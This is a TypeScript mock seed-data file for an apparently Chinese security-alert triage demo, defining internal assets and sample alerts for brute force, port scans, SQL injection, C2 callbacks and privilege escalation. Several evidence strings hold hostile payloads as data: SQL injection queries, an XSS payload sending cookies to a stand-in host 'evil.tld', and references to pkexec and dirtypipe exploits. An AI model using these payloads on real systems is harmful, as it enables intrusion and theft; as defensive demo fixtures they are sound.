// 预置 Mock 种子数据 —— 刻意构造 4 类场景,确保一次演示覆盖降噪/建议/学习
import type { Asset, RawAlert } from "@/types";

export const SEED_ASSETS: Asset[] = [
  { ip: "10.0.1.100", name: "核心数据库服务器", importance: 3, department: "技术部" },
  { ip: "10.0.1.102", name: "财务系统服务器", importance: 3, department: "财务部" },
  { ip: "10.0.1.101", name: "OA 系统服务器", importance: 2, department: "行政部" },
  { ip: "10.0.1.103", name: "官网 Web 服务器", importance: 2, department: "市场部" },
  { ip: "10.0.2.50", name: "测试环境服务器", importance: 1, department: "技术部" },
  { ip: "10.0.2.51", name: "内部 Wiki", importance: 1, department: "技术部" },
];

const T = (hhmm: string) => `2026-06-08T${hhmm}:00+08:00`;

export const SEED_ALERTS: RawAlert[] = [
  // 场景① 同源 192.168.100.5 对核心数据库 5 次暴力破解 -> 聚合为 1 个事件 + 时间线
  { id: "a01", name: "SSH 暴力破解尝试", alertType: "brute_force", sourceIp: "192.168.100.5", destIp: "10.0.1.100", severity: "high", timestamp: T("09:12"), status: "pending", evidence: "sshd[20451]: Failed password for root from 192.168.100.5 port 50112 ssh2" },
  { id: "a02", name: "SSH 暴力破解尝试", alertType: "brute_force", sourceIp: "192.168.100.5", destIp: "10.0.1.100", severity: "high", timestamp: T("09:13"), status: "pending", evidence: "sshd[20452]: Failed password for root from 192.168.100.5 port 50231 ssh2" },
  { id: "a03", name: "SSH 暴力破解尝试", alertType: "brute_force", sourceIp: "192.168.100.5", destIp: "10.0.1.100", severity: "high", timestamp: T("09:15"), status: "pending", evidence: "sshd[20453]: Failed password for admin from 192.168.100.5 port 50390 ssh2" },
  { id: "a04", name: "SSH 暴力破解尝试", alertType: "brute_force", sourceIp: "192.168.100.5", destIp: "10.0.1.100", severity: "high", timestamp: T("09:18"), status: "pending", evidence: "sshd[20455]: Failed password for root from 192.168.100.5 port 50544 ssh2" },
  { id: "a05", name: "SSH 暴力破解尝试", alertType: "brute_force", sourceIp: "192.168.100.5", destIp: "10.0.1.100", severity: "critical", timestamp: T("09:21"), status: "pending", evidence: "sshd: 60s 内同源 192.168.100.5 连续 12 次认证失败 (root/admin),触达爆破阈值" },

  // 场景② 同源 10.99.0.33 对官网 3 次端口扫描 -> 聚合(误报演示首选)
  { id: "a06", name: "TCP 端口扫描", alertType: "port_scan", sourceIp: "10.99.0.33", destIp: "10.0.1.103", severity: "medium", timestamp: T("09:30"), status: "pending", evidence: "nft drop IN=eth0 SRC=10.99.0.33 DST=10.0.1.103 PROTO=TCP DPT=22,80,443,3306,6379 SYN" },
  { id: "a07", name: "TCP 端口扫描", alertType: "port_scan", sourceIp: "10.99.0.33", destIp: "10.0.1.103", severity: "medium", timestamp: T("09:31"), status: "pending", evidence: "nft drop SRC=10.99.0.33 DPT=8080,8443,9000,5432 SYN (2s 内 15 端口)" },
  { id: "a08", name: "TCP 端口扫描", alertType: "port_scan", sourceIp: "10.99.0.33", destIp: "10.0.1.103", severity: "low", timestamp: T("09:33"), status: "pending", evidence: "nft drop SRC=10.99.0.33 DPT=21,23 SYN — 疑似内网运维资产盘点工具(误报候选)" },

  // 场景③ 两条独立 SQL 注入(不同源IP)-> 各自独立、不聚合,均触发 AI 建议
  { id: "a09", name: "SQL 注入攻击", alertType: "sql_injection", sourceIp: "203.0.113.7", destIp: "10.0.1.102", severity: "critical", timestamp: T("09:40"), status: "pending", evidence: "GET /finance/report?id=1' UNION SELECT username,password FROM users-- HTTP/1.1 Host: 10.0.1.102" },
  { id: "a10", name: "SQL 注入攻击", alertType: "sql_injection", sourceIp: "198.51.100.9", destIp: "10.0.1.103", severity: "high", timestamp: T("09:42"), status: "pending", evidence: "POST /login.php HTTP/1.1 | body: username=admin'-- &password=x" },

  // 场景④ 单条恶意外联(最高置信度)-> 触发 AI 处置建议
  { id: "a11", name: "疑似 C2 心跳外联", alertType: "malware_callback", sourceIp: "10.0.2.50", destIp: "45.61.137.88", severity: "critical", timestamp: T("10:05"), status: "pending", evidence: "DNS a8f3c2.duckdns.org→45.61.137.88;HTTP POST /gate.php 每 60s 定时外联,UA=Mozilla/4.0" },

  // 场景⑤ 完整入站攻击链:外部攻击者 162.158.22.10 对官网三阶段推进(侦察→初始访问→权限提升)
  { id: "a12", name: "敏感路径扫描", alertType: "web_scan", sourceIp: "162.158.22.10", destIp: "10.0.1.103", severity: "low", timestamp: T("08:50"), status: "pending", evidence: "GET /.git/config /.env /wp-admin/ /phpmyadmin/ — UA=sqlmap/1.7,429 次/分" },
  { id: "a17", name: "SQL 注入获取入口", alertType: "sql_injection", sourceIp: "162.158.22.10", destIp: "10.0.1.103", severity: "critical", timestamp: T("09:05"), status: "pending", evidence: "GET /product?id=1 AND (SELECT 1 FROM(SELECT SLEEP(5))x)-- HTTP/1.1 (时间盲注)" },
  { id: "a18", name: "注入后提权尝试", alertType: "priv_escalation", sourceIp: "162.158.22.10", destIp: "10.0.1.103", severity: "high", timestamp: T("09:35"), status: "pending", evidence: "audit: uid=33(www-data) execve(/tmp/.x);pkexec 触发 CVE-2021-4034 → setuid(0)" },

  // 填充:覆盖 P3~P0 全谱、点缀独立告警(各自单条,不成链)
  { id: "a13", name: "反射型 XSS 尝试", alertType: "xss", sourceIp: "203.0.113.50", destIp: "10.0.1.103", severity: "medium", timestamp: T("09:50"), status: "pending", evidence: "GET /search?q=<script>location='//evil.tld/c?'+document.cookie</script> HTTP/1.1" },
  { id: "a14", name: "本地提权行为", alertType: "priv_escalation", sourceIp: "10.0.2.51", destIp: "10.0.1.100", severity: "high", timestamp: T("10:10"), status: "pending", evidence: "audit: uid=1001 请求 CAP_SYS_ADMIN;dirtypipe 写入 /etc/passwd 尝试" },
  { id: "a15", name: "TCP 端口扫描", alertType: "port_scan", sourceIp: "185.220.101.5", destIp: "10.0.1.101", severity: "low", timestamp: T("10:15"), status: "pending", evidence: "nft drop SRC=185.220.101.5(Tor 出口节点)DPT=3389,22,445 SYN" },
  { id: "a16", name: "RDP 暴力破解尝试", alertType: "brute_force", sourceIp: "209.141.33.2", destIp: "10.0.1.101", severity: "medium", timestamp: T("10:20"), status: "pending", evidence: "Security 4625: 登录失败 Source=209.141.33.2 LogonType=10(RDP) 目标 Administrator(8 次)" },
];
